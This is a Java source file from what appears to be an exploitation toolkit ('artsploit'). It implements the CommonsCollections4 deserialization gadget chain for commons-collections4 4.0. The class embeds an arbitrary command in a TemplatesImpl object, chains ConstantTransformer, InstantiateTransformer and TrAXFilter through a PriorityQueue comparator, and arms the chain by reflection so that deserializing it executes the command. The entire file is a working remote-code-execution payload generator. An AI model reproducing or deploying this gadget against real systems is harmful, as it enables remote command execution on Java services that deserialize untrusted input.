package artsploit.gadgets;

import artsploit.Reflections;
import artsploit.Utilities;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.util.PriorityQueue;
import java.util.Queue;

/**
 * @className: CommonsCollections4
 * @description: TODO 类描述
 * @author: two_day
 * @date: 2022/5/12
 **/
/*
 * 适用条件： org.apache.commons:commons-collections4:4.0
 */
@SuppressWarnings({"unchecked", "rawtypes", "restriction"})
public class CommonsCollections4 implements ObjectPayload<Queue<Object>>{
    @Override
    public Queue<Object> getObject(String command) throws Exception {
        Object templates = Utilities.createTemplatesImpl(command);

        org.apache.commons.collections4.functors.ConstantTransformer constant = new ConstantTransformer(String.class);

        // mock method name until armed
        Class[] paramTypes = new Class[] { String.class };
        Object[] args = new Object[] { "foo" };
        InstantiateTransformer instantiate = new InstantiateTransformer(
                paramTypes, args);

        // grab defensively copied arrays
        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
        args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");

        ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });

        // create queue with numbers
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
        queue.add(1);
        queue.add(1);

        // swap in values to arm
        Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
        paramTypes[0] = Templates.class;
        args[0] = templates;

        return queue;
    }
}
